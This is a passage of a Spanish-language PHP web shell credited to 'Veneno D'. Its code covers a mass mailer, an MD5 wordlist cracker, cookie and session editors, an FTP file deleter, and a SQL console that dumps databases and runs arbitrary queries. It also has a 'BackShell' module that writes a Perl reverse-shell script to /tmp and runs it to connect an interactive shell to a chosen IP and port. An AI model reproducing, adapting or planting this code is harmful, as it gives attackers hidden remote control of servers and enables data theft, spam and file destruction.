echo "[+] Mensaje <b>$i</b> to <b>".$word."</b> enviado<br>";
flush();
} else {
echo "[+] Mensaje <b>$i</b> to <b>".$word."</b> No enviado<br>";
}}} else {

if(@mail($_POST['idiot'],$_POST['asunto'],$_POST['mensaje'],$need)) {
echo "[+] Mensaje <b>$i</b> to <b>".$_POST['idiot']."</b> Enviado<br>";
flush();
} else {
echo "[+] Mensaje <b>$i</b> to <b>".$_POST['idiot']."</b> No enviado<br>";
}}}
echo "</center>";
}

if (isset($_GET['md5crack'])) {

echo "
<center>
<h2>MD5 Cracker</h2><br><br>
<form action='' method=POST>
<table border=1>
<td><b>Hash: </b></td><td><input type=text name=md5 size=50 value=f81f10e631f3c519d5a44d8da976fb67go></td><tr>
<td><b>Saltado: </b></td><td><input type=text name=salto size=50></td><tr>
<td><b>Lista de palabras: </b></td><td><input type=text name=listmd5 size=50 value='/var/www/html/ejemplo.txt'></td>
</table><br><br>
<input type=submit value=Crackear>
</form>
</center>
";
}

if (isset($_POST['md5'])) {

$open = fopen($_POST['listmd5'],"r");

echo "<br><br><fieldset><center>";
echo "<br>[+] Empezando a buscar<br><br>";

while(!feof($open)) {
$word = fgets($open,255);
$linea = chop($word);

if (!empty($_POST['salto'])) {
$test = md5($linea.$_POST['salto']);
} else {
$test = md5($linea);
}
if ($test == $_POST['md5']) {
echo "<br>[+] Hash crackeado: ".$_POST['md5'].":".$linea."<br><br>";
creditos();
} else {
echo "[+] : ".$_POST['md5']." != ".$linea."<br>";
}
}
echo "<br>[+] Finalizado<br>";
echo "</center></fieldset>";
}

if (isset($_GET['cookiemanager'])) {
echo "<h2>Cookies</h2><br><br>";
echo "[+] <b>Cookies encontradas</b>: ".count($_COOKIE)."<br><br>";  

echo "
<br><BR><form action='' method=POST>
<b>Nueva cookie:</b> <input type=text name=cookienew><BR>
<b>Valor:</b> <input type=text name=valor><BR><br>
<input type=submit value=Crear><BR><br><br>
</form><br>";

echo "<table>";
echo "<td class=main><b>Nombre</b></td><td class=main><b>Valor</b></td><tr>";

if (count($_COOKIE) != 0) {
foreach  ($_COOKIE as $nombre=>$valor) {
echo "<td class=main>".$nombre."?</td><td class=main>".$valor."</td><tr>";
}
echo "</table>";
}
echo "<br><br>";
}

if (isset($_GET['sessionmanager'])) {

@session_start();

echo "<h2>Sesion</h2><br><br>";
echo "[+] <b>Sesiones encontradas</b> : ".count($_SESSION)."<br><br>";  

echo "
<br><BR><form action='' method=POST>
<b>Nueva sesion:</b> <input type=text name=sessionew><BR>
<b>Valor:</b> <input type=text name=valor><BR><br>
<input type=submit value=Create><BR><br><br>
</form><br>";

if (count($_SESSION) != 0) {

echo "<table>";
echo "<td class=main><b>Nombre</b></td><td class=main><b>Valor</b></td><tr>";

foreach  ($_SESSION as $nombre=>$valor) {
echo "<td class=main>".$nombre."</td><td class=main>".$valor."</td><tr>";
}
echo "</table>";
}
}

if (isset($_GET['ftp'])) {
echo "<center><h2>FTP Manager</h2><br>";
echo "
<table border=1>
<form action='' method=GET>
<td><b>Servidor: </b></td><td><input type=text name=serverftp value=127.0.0.1></td><tr>
<td><b>Usuario: </b></td><td><input type=text name=user value=Veneno></td><tr>
<td><b>Clave: </b></td><td><input type=text name=pass value=123></td><tr>
</table><br>
<input type=hidden name=diar value=/>
<input type=submit value=Conectar><br><br>
</center></form>
";

}
  
if (isset($_GET['serverftp'])) {
if ($enter = @ftp_connect("127.0.0.1")) {
if ($dentro = @ftp_login($enter,"Veneno","123")) {
echo "<br><b>[+] Conectado al servidor</b><br>";
} else {
echo "<br><b>[-] Error en el login</b><br><br>";
} 
echo "<b>[+] En linea</b><br><br><br>";

echo "
<form action='' method=GET>
Directory : <input type=text name=diar value=";
if (empty($_GET['diar'])) {
echo ftp_pwd($enter);
} else {
echo $_GET['diar'];
}

echo ">
<input type=hidden name=serverftp value=".$_GET['serverftp'].">
<input type=hidden name=user value=".$_GET['user'].">
<input type=hidden name=pass value=".$_GET['pass'].">
<input type=submit value=Load>
</form>
<br><br>
<form action='' method=GET>
Nuevo directorio: <input type=text name=newdirftp><input type=submit value=Load>
<input type=hidden name=serverftp value=".$_GET['serverftp'].">
<input type=hidden name=user value=".$_GET['user'].">
<input type=hidden name=pass value=".$_GET['pass'].">
<input type=hidden name=diar value=".$_GET['diar'].">
</form>
<br><br>
<br><br>";

if (isset($_GET['diar'])) {

$enter = @ftp_connect($_GET['serverftp']);
$dentro = @ftp_login($enter,$_GET['user'],$_GET['pass']);

if (empty($_GET['diar'])) {
if (!$lista = ftp_nlist($enter.".")) {
echo "<script>alert('Error al cargar directorio');</script>";
creditos();
}
} else {
if (!$lista = ftp_nlist($enter,$_GET['diar'])) {
echo "<script>alert('Pass/user incorrectos.');</script>";
creditos();
}
}
}

echo "<form action='' method=POST>";
echo "<input type=hidden name=serverftp value=".$_GET['serverftp'].">
<input type=hidden name=user value=".$_GET['user'].">
<input type=hidden name=pass value=".$_GET['pass'].">";
echo "<table>";
echo "<td class=main>Name</td><td class=main>Type</td><td class=main>Accion</td><tr>";

foreach ($lista as $ver) {
if (ftp_size($enter,ftp_pwd($enter).$ver) == -1) {
echo "<td class=main><a href=?serverftp=".$_GET['serverftp']."&user=".$_GET['user']."&pass=".$_GET['pass']."&diar=".$ver.">$ver</a></td>";
echo "<td class=main>Directory</td>";
echo "<td><input type=checkbox name=vax[] value='".$ver."'></td>";
echo "<tr>";
} else {
echo "<td class=main>".$ver."</td>";
echo "<td class=main>File</td>";
echo "<td><input type=checkbox name=vax[] value='".$ver."'></td>";
echo "<tr>";
}
}


if (isset($_POST['furia'])) {

$files = $_POST['vax'];

$enter = ftp_connect($_POST['serverftp']);
$dentro = ftp_login($enter,$_POST['user'],$_POST['pass']);

foreach($files as $file) {

if (ftp_delete($enter,ftp_pwd($enter)."/".$file)) {
} else {
ftp_rmdir($enter,ftp_pwd($enter)."/".$file);
}
}
echo "<script>alert('Archivos borrados');</script>";
}


echo "</table>";
echo"<br><br>
Options : 
<select name=op>
<option>Eliminar</option>
</select>&nbsp;&nbsp;<input type=submit name=furia value=Ok></form>";

} else {
echo "<b>[-] Error en el servidor</b><br><br>";
}

}

if (isset($_GET['newdirftp'])) {

$enter = ftp_connect($_GET['serverftp']);
$dentro = ftp_login($enter,$_GET['user'],$_GET['pass']);

if (ftp_mkdir($enter,$_GET['diar'].$_GET['newdirftp'])) {
echo "<script>alert('Directorio creado');</script>";
echo '<meta http-equiv="refresh" content="0;URL=?serverftp='.$_GET['serverftp']."&user=".$_GET['user']."&pass=".$_GET['pass']."&diar=".$_GET['diar'].'>';
} else {
echo "<script>alert('Error');</script>";
}
}


if (isset($_GET['backshell'])) {

echo "
<center>
<h2>BackShell</h2><br><br>
<table border=1>
<form action='' method=GET>
<td><b>IP: </b></td><td><input type=text name=ipar value=".$_SERVER['REMOTE_ADDR']."></td><tr>
<td><b>Port: </b></td><td><input type=text name=portar value=666></td><tr>
<td><b>Type: </b></td><td><select name=tipo>
<option>Perl</option>
</select></td><tr></table>
<br><br>
<input type=submit value=Conectar>
</center>
</form>
";
}

if (isset($_GET['ipar'])) {
if ($_GET['tipo']=="Perl") {

$code = ' 
#!usr/bin/perl
#Reverse Shell 0.2
#By Veneno D

use IO::Socket;

print "\n -- Reverse Shell 0.2 - Veneno Deron 2012 -- \n\n";

unless (@ARGV == 2) { 
print "[Sintax] : $0 <host> <port>\n\n";
exit(1);
} else {
print "[+] Conectandose\n";
print "[+] Entrando en el sistema\n";
print "[+] Conectado\n\n";
conectar($ARGV[0],$ARGV[1]);
tipo();
}

sub conectar {

socket(REVERSE, PF_INET, SOCK_STREAM, getprotobyname("tcp"));
connect(REVERSE, sockaddr_in($_[1],inet_aton($_[0])));
open (STDIN,">&REVERSE");
open (STDOUT,">&REVERSE");
open (STDERR,">&REVERSE");
}

sub tipo {
print "\n[*] Reverse Shell conectando...\n\n";
if ($^O =~/Win32/ig) {
infowin();
system("cmd.exe");
} else {
infolinux();
system("export TERM=xterm;exec sh -i");
}
}

sub infowin {
print "[+] Domain Name: ".Win32::DomainName()."\n";
print "[+] OS Version: ".Win32::GetOSName()."\n";
print "[+] Username: ".Win32::LoginName()."\n\n\n";
}

sub infolinux {
print "[+] System info\n\n";
system("uname -a");
print "\n\n";
}

# &#191; VENENO

';

echo "<center><h2>OutPut</h2></center>";

$de = $_SERVER["HTTP_USER_AGENT"];

if(eregi("Win",$de)){
if ($test =  fopen("back.pl","w")) {
echo "<br><br><b><center>[+] Shell Creada</b><br>";
} else {
echo "<br><br><b>[-] Error al crear la shell</b><br>";
}
} else {
if ($test = fopen("/tmp/back.pl","w")) {
echo "<br><br><b>[+] Shell Creada</b><br>";
} else {
echo "<br><br><b>[-] Error al crear la shell</b><br>";
}
}

if (fwrite($test,$code)) {
if(eregi("Win",$de)){
if (chmod("back.pl",0777)) {
echo "<b>[+] Permisos cambiados<br></b>";
} else {
echo "<b>[-] No hay privilegios para cambiar permisos</b><br>";
}
echo "<b>[+] Cargando shell</b><br><br><br>";
echo "<br><BR>";
echo "<fieldset>";
if (!system("perl back.pl ".$_GET['ipar']. " ".$_GET['portar'])) {
echo "<script>alert('Error al cargar la shell');</script>";
}
echo "</fieldset>";
} else {
if (chmod("/tmp/back.pl",0777)) {
echo "<b>[+] Permisos cambiados<br></b>";
} else {
echo "<b>[-] No hay privilegios para cambiar permisos</b><br>";
}
echo "<b>[+] Cargando shell</b><br><br><br>";
echo "<br><BR>";
echo "<fieldset>";
if (!system("cd /tmp;perl back.pl ".$_GET['ipar']. " ".$_GET['portar'])) {
echo "<script>alert('Error al cargar la shell');</script>";
}
echo "</center></fieldset>";
}
} else {
echo "<br><b>[-] Error al escribir en la shell<br><br></b>";
}}
echo "<br><br>";
}

if (isset($_GET['oculto'])) {

echo "
<center><h2>SQL interface</h2></center><br>
<center>
<table border=1>
<form action='' method=GET>
<td><b>Servidor: </b></td><td><input type=text name=host value=localhost></td><tr>
<td><b>Usuario: </b></td><td><input type=text name=usuario value=root></td><tr>
<td><b>Clave: </b></td><td><input type=text name=password value=123></td><tr>
</table>
<br><input type=submit name=entersql value=Connect>
</form></center>
";

}

if (isset($_GET['entersql'])) {
if ($mysql = @mysql_connect($_GET['host'],$_GET['usuario'],$_GET['password'])) {
if ($databases = @mysql_list_dbs($mysql)) {
  
echo "<br><br><center><h2>Databases encontradas</h2><br>";
echo "<table>";
while($dat = @mysql_fetch_row($databases)) {
foreach($dat as $indice => $valor) {
echo  "<td class=main>$valor</td><td class=main><a href=?datear=$valor&host=".$_GET['host']."&usuario=".$_GET['usuario']."&password=".$_GET['password']."&enterdb=".$valor.">Entrar</a></td><td class=main><a href=?datear=$valor&host=".$_GET['host']."&usuario=".$_GET['usuario']."&password=".$_GET['password']."&bajardb=".$valor.">Descargar</a></td><tr>";
} 
}
echo "</table>";
} else {
echo "<script>alert('Error al cargar las bases de datos');</script>";
creditos();
}
} else {
echo "<script>alert('Error');</script>";
creditos();
}
}

if (isset($_GET['enterdb'])) {
$mysql = mysql_connect($_GET['host'],$_GET['usuario'],$_GET['password']);
mysql_select_db($_GET['enterdb']);
echo "<center>";
$tablas = mysql_query("show tables from ".$_GET['enterdb'])  or die("error");
echo "<br><h2>Tablas encontradas</h2><br><br><table>";
while ($tabla = mysql_fetch_row($tablas)) {
foreach($tabla as $indice => $valor) {
echo "<td class=main>$valor</td><td class=main><a href=?datear=$valor&host=".$_GET['host']."&usuario=".$_GET['usuario']."&password=".$_GET['password']."&entertable=".$valor."&condb=".$_GET['enterdb'].">Entrar</a></td></td><td class=main><a href=?datear=$valor&host=".$_GET['host']."&usuario=".$_GET['usuario']."&password=".$_GET['password']."&bajartabla=".$valor."&condb=".$_GET['enterdb'].">Download</a><tr>";
} 
}
echo "</table>";
}

if (isset($_GET['entertable'])) {

$mysql = mysql_connect($_GET['host'],$_GET['usuario'],$_GET['password']);
mysql_select_db($_GET['condb']);

echo "<br><center><h2>SQL interface</h2>
<br><br>
<form action='' method=POST>
<b>Consulta SQL: </b><input type=text name=sentencia size=70 value='select * from ".$_GET['datear']."'>
<br><br><br>  
<input type=hidden name=host value=".$_GET['host'].">
<input type=hidden name=usuario value=".$_GET['usuario'].">
<input type=hidden name=password value=".$_GET['password'].">
<input type=hidden name=condb value=".$_GET['database'].">
<input type=hidden name=entertable value=".$_GET['tabla'].">
<input type=submit name=mostrar value=eNViar>
</form>
<br><br><br><br><br>";

$conexion = mysql_connect($_GET['host'],$_GET['usuario'],$_GET['password']) or die("<h1>Error</h1>");
mysql_select_db($_GET['condb']);

if (isset($_POST['mostrar'])) {
if(!empty($_POST['sentencia'])) {
$resultado =  mysql_query($_POST['sentencia']);
} else {
$resultado = mysql_query("SELECT * FROM ".$_GET['entertable']);
}

$numer = 0;

echo "<table>";
for ($i=0;$i< mysql_num_fields($resultado);$i++) {
echo "<th class=main>".mysql_field_name($resultado,$i)."</th>";
$numer++;
}
while($dat = mysql_fetch_row($resultado)) {
echo "<tr>";
foreach($dat as $val) {
echo "<td class=main>".$val."</td>";
}
}
echo "</tr></table>";
}
}

creditos();


} else {

echo "<body background=http://i.imgur.com/k5r0wlj.jpg>
<div style=position:fixed;bottom:0px;z-index:;right:210px;>
<center><form action='' method=POST>
<input type=text name=user value=Usuario><br>
<input type=text name=pass value=*****><br><br>
<input type=image src=http://i.imgur.com/jjA6CzE.png width=50 value=Login>
</form></center></div>
";

}

// &#191; Deja los créditos ladrón

?>
